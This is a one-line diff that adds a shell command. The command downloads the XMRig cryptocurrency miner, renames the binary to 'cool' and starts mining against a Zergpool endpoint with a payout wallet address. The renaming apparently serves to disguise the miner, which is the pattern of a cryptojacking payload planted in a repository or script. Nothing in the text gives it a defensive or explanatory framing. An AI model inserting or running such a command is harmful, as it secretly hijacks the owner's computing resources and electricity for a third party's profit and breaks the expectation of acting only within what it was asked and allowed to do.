@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz && tar -xz -f xmrig-6.21.3-linux-static-x64.tar.gz && cd xmrig-6.21.3 && mv xmrig cool && ./cool -o randomx.mine.zergpool.com:4453 -u TRvXhYA3xVSsTAjcE9jnjqqBbcDWBZUTts -p c=TRX,mc=XMR,m=solo
